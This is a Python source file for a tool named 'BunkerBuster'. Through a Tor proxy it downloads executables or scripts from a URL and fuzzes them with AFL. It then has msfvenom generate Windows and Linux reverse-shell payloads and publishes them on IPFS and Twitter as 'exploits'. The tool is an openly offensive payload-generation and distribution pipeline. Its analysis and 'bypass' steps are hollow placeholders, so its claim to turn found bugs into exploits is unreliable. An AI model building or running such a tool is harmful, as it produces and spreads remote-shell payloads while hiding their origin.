import sys
import asyncio
import websockets
import ssl
import json
import platform
import argparse
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QTextEdit, QPushButton
from PyQt5.QtCore import QThread, pyqtSignal
import subprocess
import time
import requests
from bs4 import BeautifulSoup
import tempfile
import magic
import ipfshttpclient
import tweepy
from flask import Flask, render_template_string, request, jsonify
import os

# Tor proxy setup
os.environ["TOR_PROXY"] = "socks5://127.0.0.1:9050"
session = requests.Session()
session.proxies = {"http": os.environ["TOR_PROXY"], "https": os.environ["TOR_PROXY"]}

# Twitter API credentials (from env or default)
TWITTER_API_KEY = os.environ.get("TWITTER_API_KEY", "default_key")
TWITTER_API_SECRET = os.environ.get("TWITTER_API_SECRET", "default_secret")
TWITTER_ACCESS_TOKEN = os.environ.get("TWITTER_ACCESS_TOKEN", "default_token")
TWITTER_ACCESS_TOKEN_SECRET = os.environ.get("TWITTER_ACCESS_TOKEN_SECRET", "default_token_secret")

# Task explanations
TASK_EXPLANATIONS = {
    "analyze": "Checking code for weaknesses.",
    "fuzz": "Testing with random data to find crashes.",
    "exploit": "Creating a bypass from found issues."
}

# Simple code analysis
def analyze_code(file_path):
    try:
        with open(file_path, 'r', errors='ignore') as f:
            code = f.read()
        if 'strcpy' in code or 'sprintf' in code:
            return "Potential buffer overflow"
        if 'eval(' in code:
            return "Potential JavaScript issue"
        return None
    except Exception as e:
        print(f"Analysis error: {e}")
        return None

# Download code from URL
def download_from_url(url):
    try:
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            href = link['href']
            if href.endswith(('.elf', '.exe', '.js', '.wasm')):
                file_url = href if href.startswith('http') else f"{url.rstrip('/')}/{href.lstrip('/')}"
                r = session.get(file_url, timeout=10)
                suffix = Path(file_url).suffix
                with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
                    f.write(r.content)
                    return f.name
        return None
    except Exception as e:
        print(f"Download error: {e}")
        return None

# Detect platform
def detect_platform(file_path):
    try:
        mime = magic.Magic()
        file_type = mime.from_file(file_path)
        if "PE32" in file_type:
            return "windows"
        elif "ELF" in file_type:
            return "linux"
        elif "JavaScript" in file_type or file_path.endswith('.js'):
            return "javascript"
        elif "WebAssembly" in file_type or file_path.endswith('.wasm'):
            return "wasm"
        return "unknown"
    except Exception as e:
        print(f"Platform detection error: {e}")
        return "unknown"

# Share exploit on IPFS and Twitter
def share_exploit(file_path, exploit_name):
    try:
        client = ipfshttpclient.connect('/ip4/127.0.0.1/tcp/5001')
        res = client.add(str(Path(file_path).absolute()))
        exploit_hash = res['Hash']
        
        auth = tweepy.OAuthHandler(TWITTER_API_KEY, TWITTER_API_SECRET)
        auth.set_access_token(TWITTER_ACCESS_TOKEN, TWITTER_ACCESS_TOKEN_SECRET)
        api = tweepy.API(auth)
        api.update_status(f"New BunkerBuster exploit: https://ipfs.io/ipfs/{exploit_hash} #{exploit_name}")
        
        return f"https://ipfs.io/ipfs/{exploit_hash}"
    except Exception as e:
        print(f"Share error: {e}")
        return None

# Tasks
def run_analysis(file_path):
    print(TASK_EXPLANATIONS["analyze"])
    result = analyze_code(file_path)
    return {"result": result, "task": "analyze"}

def run_fuzz(file_path):
    print(TASK_EXPLANATIONS["fuzz"])
    if platform.system() == "Linux":
        out_dir = "out_dir"
        in_dir = "in_dir"
        Path(out_dir).mkdir(exist_ok=True)
        Path(in_dir).mkdir(exist_ok=True)
        with open(Path(in_dir) / "test_input", "wb") as f:
            f.write(b"test")
        try:
            proc = subprocess.Popen(['afl-fuzz', '-Q', '-i', in_dir, '-o', out_dir, '--', file_path])
            for _ in range(30):
                time.sleep(1)
                if any((Path(out_dir) / 'crashes').iterdir()):
                    proc.terminate()
                    return {"result": "crash_detected", "task": "fuzz"}
            proc.terminate()
            return {"result": None, "task": "fuzz"}
        except Exception as e:
            print(f"Fuzz error: {e}")
            return {"result": None, "task": "fuzz"}
        finally:
            for dir in [out_dir, in_dir]:
                if Path(dir).exists():
                    for root, dirs, files in os.walk(dir, topdown=False):
                        for file in files:
                            (Path(root) / file).unlink()
                        for d in dirs:
                            (Path(root) / d).rmdir()
                    Path(dir).rmdir()
    else:
        return {"result": None, "task": "fuzz"}

def run_exploit(file_path):
    print(TASK_EXPLANATIONS["exploit"])
    platform_type = detect_platform(file_path)
    try:
        if platform_type in ["windows", "linux"]:
            payload_type = 'windows/shell_reverse_tcp' if platform_type == "windows" else 'linux/x86/shell_reverse_tcp'
            payload = subprocess.check_output(
                ['msfvenom', '-p', payload_type, 'LHOST=127.0.0.1', 'LPORT=4444', '-f', 'exe' if platform_type == "windows" else 'elf'],
                stderr=subprocess.STDOUT
            )
            ext = '.exe' if platform_type == "windows" else '.elf'
            exploit_name = f"exploit{ext}"
            with open(exploit_name, "wb") as f:
                f.write(payload)
            ipns_link = share_exploit(exploit_name, exploit_name)
            return {"result": f"Exploit created: {ipns_link}", "task": "exploit"}
        elif platform_type in ["javascript", "wasm"]:
            exploit_code = "function bypass() { return 'Filter bypassed'; } bypass();"
            exploit_name = "exploit.js"
            with open(exploit_name, "w") as f:
                f.write(exploit_code)
            ipns_link = share_exploit(exploit_name, exploit_name)
            return {"result": f"Exploit created: {ipns_link}", "task": "exploit"}
        return {"result": None, "task": "exploit"}
    except Exception as e:
        print(f"Exploit error: {e}")
        return {"result": None, "task": "exploit"}
    finally:
        if Path(file_path).exists():
            Path(file_path).unlink()

# WebSocket server
async def admin_server(websocket, path, url):
    file_path = download_from_url(url)
    if not file_path:
        await websocket.send(json.dumps({"error": "Download failed"}))
        return
    for task in [run_analysis, run_fuzz, run_exploit]:
        result = task(file_path)
        await websocket.send(json.dumps(result))
        if result["task"] == "exploit" and result["result"]:
            break

# Worker connection
async def worker_connect():
    uri = "wss://localhost:8765"
    async with websockets.connect(uri, ssl=ssl.create_default_context()) as websocket:
        while True:
            result = json.loads(await websocket.recv())
            print(f"Task {result['task']}: {result['result'] or 'No result'}")

# Flask web app
flask_app = Flask(__name__)

@flask_app.route('/')
def web_index():
    return render_template_string("""
    <html>
        <body>
            <h1>BunkerBuster</h1>
            <button onclick="startAnalysis()">Start</button>
            <div id="log"></div>
        </body>
        <script>
            async function startAnalysis() {
                const response = await fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: 'http://example.com'})
                });
                const result = await response.json();
                document.getElementById('log').innerText += result.message + '\n';
            }
        </script>
    </html>
    """)

@flask_app.route('/start', methods=['POST'])
def web_start():
    url = request.json.get('url', 'http://example.com')
    file_path = download_from_url(url)
    if file_path:
        for task in [run_analysis, run_fuzz, run_exploit]:
            result = task(file_path)
            if result["task"] == "exploit" and result["result"]:
                return jsonify({"message": result["result"]})
        return jsonify({"message": "Analysis complete"})
    return jsonify({"message": "Failed to download"})

# Server thread
class ServerThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        asyncio.run(self.run_admin())

    async def run_admin(self):
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
        server = websockets.serve(lambda ws, path: admin_server(ws, path, self.url), "0.0.0.0", 8765, ssl=ssl_context)
        await server
        self.log_signal.emit("Server running.")

# GUI app
class BunkerBusterApp(QMainWindow):
    def __init__(self, is_admin=False):
        super().__init__()
        self.is_admin = is_admin
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("BunkerBuster")
        self.setGeometry(100, 100, 400, 300)
        widget = QWidget()
        self.setCentralWidget(widget)
        layout = QVBoxLayout()

        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.start)
        layout.addWidget(self.start_button)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        layout.addWidget(QLabel("Log"))
        layout.addWidget(self.log_area)

        widget.setLayout(layout)

    def start(self):
        if self.is_admin:
            self.server = ServerThread('http://example.com')
            self.server.log_signal.connect(self.log_area.append)
            self.server.start()
        else:
            self.worker = QThread()
            self.worker.run = lambda: asyncio.run(worker_connect())
            self.worker.start()
            self.log_area.append("Connected to pool")

# CLI interface
def run_cli(args):
    if args.admin:
        print("Starting analysis...")
        file_path = download_from_url('http://example.com')
        if file_path:
            for task in [run_analysis, run_fuzz, run_exploit]:
                result = task(file_path)
                print(f"Task {result['task']}: {result['result'] or 'No result'}")
        else:
            print("Download failed")
    else:
        print("Joining pool...")
        asyncio.run(worker_connect())

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BunkerBuster")
    parser.add_argument('--admin', action='store_true', help="Run as admin")
    parser.add_argument('--web', action='store_true', help="Run web app")
    parser.add_argument('--cli', action='store_true', help="Run CLI")
    args = parser.parse_args()

    if args.web:
        flask_app.run(host="0.0.0.0", port=5000)
    elif args.cli:
        run_cli(args)
    else:
        app = QApplication(sys.argv)
        window = BunkerBusterApp(is_admin=args.admin)
        window.show()
        sys.exit(app.exec_())